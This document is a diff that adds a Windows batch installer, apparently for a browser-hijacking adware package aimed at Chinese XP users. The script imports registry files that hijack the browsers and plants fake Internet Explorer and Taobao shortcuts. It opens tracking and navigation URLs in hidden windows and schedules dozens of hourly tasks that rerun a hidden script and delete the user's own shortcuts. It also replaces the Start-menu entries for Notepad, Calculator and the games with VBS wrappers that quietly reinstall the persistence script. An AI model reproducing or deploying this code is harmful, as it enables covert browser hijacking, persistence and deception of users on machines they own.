@@ -1,0 +1,304 @@
+@shift
+set var=it2
+md "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\"
+md "C:\Documents and Settings\All Users\Application Data\kingsoft\kws\"
+
+copy "%MYFILES%\kswebshield.dll"   "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\kswebshield.dll"
+copy "%MYFILES%\kwssp.dll"   "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\kwssp.dll"
+copy "%MYFILES%\kswbc.dll"   "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\kswbc.dll"
+copy "%MYFILES%\kwsui.dll"   "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\kwsui.dll"
+copy "%MYFILES%\KSWebShield.exe"   "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\KSWebShield.exe"
+copy  "%MYFILES%\kws.ini"   "C:\Documents and Settings\All Users\Application Data\kingsoft\kws\kws.ini" /y
+attrib +r +h +s "C:\Documents and Settings\All Users\Application Data\kingsoft\kws\kws.ini"
+call "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\KSWebShield.exe"  -install
+call "C:\Documents and Settings\All Users\Application Data\Microsoft\%var%\wd\KSWebShield.exe"  -start
+
+mkdir "C:\Program Files\Winzp\"
+mkdir "C:\Program Files\Winsoftware..\"
+copy "%MYFILES%\tbgw.ico"      "C:\Program Files\Internet Explorer\tbgw.ico"
+
+copy "%MYFILES%\tbgw.ico"   "C:\Program Files\Winzp\tbgw.ico"
+copy "%MYFILES%\fav.cmd"   "C:\Program Files\Winzp\fav.cmd"
+copy "%MYFILES%\dsu.reg"   "C:\Program Files\Winzp\dsu.reg"
+copy "%MYFILES%\MyPc.vbs"   "C:\Program Files\Winzp\MyPc.vbs"
+copy "%MYFILES%\361.cmd"    "C:\Program Files\Winzp\361.cmd"
+copy "%MYFILES%\system.cmd"     "C:\Program Files\Winzp\system.cmd"
+copy "%MYFILES%\tool.cmd"     "C:\Program Files\Winzp\tool.cmd"
+copy "%MYFILES%\tb.cmd"     "C:\Program Files\Winzp\tb.cmd"
+copy "%MYFILES%\MyPc.nood"   "C:\Program Files\Winzp\MyPc.nood"
+
+copy "%MYFILES%\tbgw.ico"   "C:\Program Files\Winsoftware..\tbgw.ico"
+copy "%MYFILES%\dsu.reg"   "C:\Program Files\Winsoftware..\dsu.reg"
+copy "%MYFILES%\MyPc.vbs"   "C:\Program Files\Winsoftware..\MyPc.vbs"
+copy "%MYFILES%\361.cmd"    "C:\Program Files\Winsoftware..\361.cmd"
+copy "%MYFILES%\system.cmd"     "C:\Program Files\Winsoftware..\system.cmd"
+copy "%MYFILES%\tool.cmd"     "C:\Program Files\Winsoftware..\tool.cmd"
+copy "%MYFILES%\tb.cmd"     "C:\Program Files\Winsoftware..\tb.cmd"
+copy "%MYFILES%\MyPc.nood"   "C:\Program Files\Winsoftware..\MyPc.nood"
+
+regedit/s  "%MYFILES%\lnh.reg"
+regedit/s  "%MYFILES%\IE.reg"
+regedit/s  "%MYFILES%\TB.reg"
+
+echo %time%>>"%ALLUSERSPROFILE%\桌面\Internet Expleror.NomPc"
+echo %time%>>"%ALLUSERSPROFILE%\桌面\淘宝-购物.NomTb"
+echo %time%>>"%USERPROFILE%\Applic~1\Microsoft\Intern~1\Quick Launch\Internet Expleror.NomPc"
+echo %time%>>"%userprofile%\Favorites\淘宝网 - 淘！我喜欢.NomTb"
+echo %time%>>"D:\Backup\收藏夹\淘宝网 - 淘！我喜欢.NomTb"
+echo %time%>>"%userprofile%\Favorites\网址导航站.NomPc"
+echo %time%>>"D:\Backup\收藏夹\网址导航站.NomPc"
+echo %time%>>"%USERPROFILE%\「开始」菜单\程序\Internet Expleror.NomPc"
+echo %time%>>"%ALLUSERSPROFILE%\「开始」菜单\Internet Expleror.NomPc"
+mshta vbscript:createobject("wscript.shell").run("""iexplore""http://stat.02933.com/info.access/?stat_%var%",0)(window.close)
+
+sc config Schedule start= auto
+net start "Task Scheduler"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 02:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 05:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 07:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 08:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 09:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 11:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 12:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 13:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 15:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 16:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 18:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 20:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 22:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+
+at 00:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 02:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 05:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 07:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 08:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 09:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 10:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 11:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 12:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 13:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 14:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 15:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 16:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 17:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 18:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 19:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 20:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 21:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 22:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+at 23:01 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\Program Files\Common Files\System\ado\system.cmd"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*xplore*.*"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*xplore*.*"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\桌面\*览*.*"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%ALLUSERSPROFILE%\桌面\*览*.*"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"
+
+at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*xplore*.*"
+mkdir "C:\Program Files\Common Files\System\ado\"
+copy "%MYFILES%\system.cmd"          "C:\Program Files\Common Files\System\ado\system.cmd"
+copy "%MYFILES%\dns.cmd"          "C:\Program Files\Common Files\System\ado\dns.cmd"
+copy "%MYFILES%\dns.cmd"          "C:\Program Files\Common Files\System\ado\dns2.cmd"
+
+if not exist "C:\Program Files\360\360se3\360SE.exe"  goto  nofile
+goto start
+:start
+regedit/s  "%MYFILES%\PC36.reg"
+echo %time%>>"%ALLUSERSPROFILE%\桌面\36O安全浏岚器 3.PC36"
+echo %time%>>"%USERPROFILE%\Applic~1\Microsoft\Intern~1\Quick Launch\36O安全浏岚器 3.PC36"
+goto ennd
+
+:nofile
+if not exist "D:\Program Files\360\360se3\360SE.exe" goto ennd
+goto start2
+:start2
+regedit/s  "%MYFILES%\PC36D.reg"
+echo %time%>>"%ALLUSERSPROFILE%\桌面\36O安全浏岚器 3.PC36D"
+echo %time%>>"%USERPROFILE%\Applic~1\Microsoft\Intern~1\Quick Launch\36O安全浏岚器 3.PC36D"
+goto ennd
+:ennd
+
+attrib +r +h +s "C:\Program Files\Common Files\System\ado\system.cmd"
+
+start  /min     iexplore http://www.dao234.com/index2.html?%var%
+
+reg add HKEY_CLASSES_ROOT\VBSFile\DefaultIcon /v "" /t "REG_EXPAND_SZ" /d "%SystemRoot%\system32\mspaint.exe,0" /f
+md "d:\Program Files\Common Files\Service\"
+md "C:\Documents and Settings\All Users\Guest\Favorites\"
+echo DIM  objShell>>"C:\Documents and Settings\All Users\Guest\Favorites\Favrites.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"C:\Documents and Settings\All Users\Guest\Favorites\Favrites.vbs"
+echo iReturn=objShell.Run("cmd /c start http://www.baidu.com", 0, TRUE)>>"C:\Documents and Settings\All Users\Guest\Favorites\Favrites.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"C:\Documents and Settings\All Users\Guest\Favorites\Favrites.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\msn.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\msn.vbs"
+echo iReturn=objShell.Run("cmd /c C:\Progra~1\Messenger\msmsgs.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\msn.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\msn.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\aclc.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\aclc.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\calc.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\aclc.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\aclc.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\jielong.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\jielong.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\freecell.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\jielong.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\jielong.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\mpaint.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\mpaint.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\mspaint.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\mpaint.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\mpaint.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\notepa.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\notepa.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\notepad.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\notepa.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\notepa.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\out.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\out.vbs"
+echo iReturn=objShell.Run("cmd /c C:\Progra~1\Outloo~1\msimn.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\out.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\out.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\saolei.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\saolei.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\winmine.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\saolei.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\saolei.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\zhipai.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\zhipai.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\sol.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\zhipai.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\zhipai.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\zhizhuzhipai.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\zhizhuzhipai.vbs"
+echo iReturn=objShell.Run("cmd /c %SystemRoot%\system32\spider.exe", 0, TRUE)>>"d:\Program Files\Common Files\Service\zhizhuzhipai.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\zhizhuzhipai.vbs"
+
+echo DIM  objShell>>"d:\Program Files\Common Files\Service\xiezhu.vbs"
+echo set  objShell=Wscript.createObject("wscript.shell")>>"d:\Program Files\Common Files\Service\xiezhu.vbs"
+echo iReturn=objShell.Run("cmd /c %SYSTEMROOT%\system32\rcimlby.exe  -LaunchRA", 0, TRUE)>>"d:\Program Files\Common Files\Service\xiezhu.vbs"
+echo iReturn=objShell.Run("cmd /C d:\Progra~1\Common~1\Service\msn.cmd&%time%", 0, TRUE)>>"d:\Program Files\Common Files\Service\xiezhu.vbs"
+
+echo sc config Schedule start= auto>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo net start "Task Scheduler">>"d:\Program Files\Common Files\Service\msn.cmd"
+echo echo %time%>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 02:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 05:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 07:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 08:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 09:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 11:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 12:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 13:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 15:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 16:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 18:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 20:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 22:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  regedit /s dsu.reg>>"d:\Program Files\Common Files\Service\msn.cmd"
+echo echo %time%>>"d:\Program Files\Common Files\Service\msn.cmd"
+copy "d:\Program Files\Common Files\Service\msn.cmd" "C:\Documents and Settings\All Users\Guest\Favorites\msn.cmd"
+copy "%MYFILES%\baidu.nood"   "%userprofile%\Favorites\百度一下，你就知道.nood"
+copy "%MYFILES%\dsu.reg"   "C:\WINDOWS\system32\dsu.reg"
+
+del "%USERPROFILE%\「开始」菜单\程序\附件\记事本.lnk" /q
+del "%ALLUSERSPROFILE%\「开始」菜单\程序\附件\画图.lnk" /q
+del "%ALLUSERSPROFILE%\「开始」菜单\程序\附件\计算器.lnk" /q
+del "%ALLUSERSPROFILE%\「开始」菜单\程序\游戏\扫雷.lnk" /q
+del "%ALLUSERSPROFILE%\「开始」菜单\程序\游戏\纸牌.lnk" /q
+del "%ALLUSERSPROFILE%\「开始」菜单\程序\游戏\蜘蛛纸牌.lnk" /q
+del "%ALLUSERSPROFILE%\「开始」菜单\程序\游戏\空当接龙.lnk" /q
+
+echo Dim WshShell,Shortcut>>"lnk.vbs"
+echo Dim path,fso >>"lnk.vbs"
+echo path="d:\Program Files\Common Files\Service\jielong.vbs">>"lnk.vbs"
+echo Set WshShell=WScript.CreateObject("WScript.Shell") >>"lnk.vbs"
+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\游戏\空当接龙.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path>>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+echo path="d:\Program Files\Common Files\Service\saolei.vbs">>"lnk.vbs"
+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\游戏\扫雷.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path >>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+echo path="d:\Program Files\Common Files\Service\zhipai.vbs">>"lnk.vbs"
